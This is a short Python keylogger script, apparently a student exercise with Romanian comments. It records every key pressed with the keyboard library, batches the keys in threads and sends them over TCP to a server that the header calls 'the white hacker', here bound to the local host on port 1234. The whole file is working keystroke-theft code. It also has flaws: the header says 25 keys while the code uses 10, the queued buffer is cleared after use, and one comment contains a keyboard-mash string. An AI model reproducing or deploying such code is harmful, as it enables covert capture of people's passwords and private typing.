#--------------------Program purpose-------------------
#we take each 25 keys and send it to the white hacker using tcp protocol

#--------------------Libraries-----------------------
import time
import keyboard
import socket
import threading
from threading import Condition, Thread, Lock

#--------------------Variables-----------------------
# #global variable
bufferQueue = [["#","#","#"]]  
condition = Condition()    
buffer = [] #list of key pressed 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #ipv4 tcp socket 
s.connect( (socket.gethostname(), 1234) )             #ne conectam la server

def SendBuffersToServer():
    #ca sa nu o folosim pe bufferqueue locala - anunt interpretorul
    global bufferQueue

    while True:
        condition.acquire()
        if not bufferQueue:
            condition.wait()
        print(f"avem {len(bufferQueue)} liste in buffer queue si primul element e {bufferQueue[0]}")
        buffer1 = bufferQueue[0]
        bufferQueue.pop(0)
        msgToSendString = " ".join(buffer1)           #convert the list into a string 
        msgToSend = bytes(msgToSendString,"utf-8")    #convert the string in bytes format
        print(f"am trimis (consumat) {buffer1}")
        s.send(msgToSend)                           #send it to the server                                        
        condition.release()
        time.sleep(1)


def GetBuffers():
    #sunt pe consumer aici 
    global bufferQueue, buffer

    while True: 
        keyPressed = keyboard.read_key()                  #take the key pressed adsadsadadasczcz;'lsadf,'a;sfkweiojfawlkfnmzsldkfmwafewat the moment 
        buffer.append(str(keyPressed))                    #append to list of key pressed 
        #print(keyPressed)                                #debugging purpose
        condition.acquire()
        if len(bufferQueue) == 10:
            condition.wait() 
        if len(buffer) == 10:
            bufferQueue.append(buffer)
            print(f"am adaugat (produs) {buffer}")
            condition.notify() #notificam threadul celalalt cand avem 
            buffer.clear() 
        condition.release()
        time.sleep(1)

t2 = threading.Thread(target = SendBuffersToServer)
t3 = threading.Thread(target = GetBuffers)
t3.start()
t2.start()



